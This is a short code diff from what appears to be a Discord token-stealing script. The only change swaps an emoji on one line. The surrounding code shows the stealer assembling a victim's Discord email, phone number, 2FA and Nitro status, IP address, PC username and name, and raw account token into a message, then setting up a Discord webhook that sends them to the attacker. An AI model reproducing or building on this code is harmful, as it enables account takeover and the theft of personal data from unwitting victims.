@@ -156,7 +156,7 @@ def get_token():
                         xxx = f"""**{user_name}** *({user_id})*\n
 > :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tNitro Expires in: `{days_left if days_left else "None"} day(s)`\n
 > :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
-> :piñata: __Token__\n\t`{tok}`"""
+> :tokyo_tower: __Token__\n\t`{tok}`"""
                         webhook = DiscordWebhook(url=f"{webhookdiscord}")
                         embed = DiscordEmbed(title="__Account Information__", description=f"""{xxx}""", color="080808")
                         embed.set_timestamp()
